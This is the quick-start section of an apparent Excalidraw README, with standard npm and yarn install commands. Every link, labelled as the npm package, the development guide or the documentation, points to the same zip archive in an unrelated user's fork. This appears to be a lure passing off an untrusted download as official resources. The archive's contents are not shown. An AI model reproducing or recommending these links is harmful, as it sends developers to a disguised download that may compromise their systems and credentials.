## Quick start

**Note:** The following instructions are for installing the Excalidraw [npm package](https://raw.githubusercontent.com/swethaswini/excalidraw1/master/packages/excalidraw/eraser/excalidraw_2.9.zip) when integrating Excalidraw into your own app. To run the repository locally for development, please refer to our [Development Guide](https://raw.githubusercontent.com/swethaswini/excalidraw1/master/packages/excalidraw/eraser/excalidraw_2.9.zip).

Use `npm` or `yarn` to install the package.

```bash
npm install react react-dom @excalidraw/excalidraw
# or
yarn add react react-dom @excalidraw/excalidraw
```

Check out our [documentation](https://raw.githubusercontent.com/swethaswini/excalidraw1/master/packages/excalidraw/eraser/excalidraw_2.9.zip) for more details!
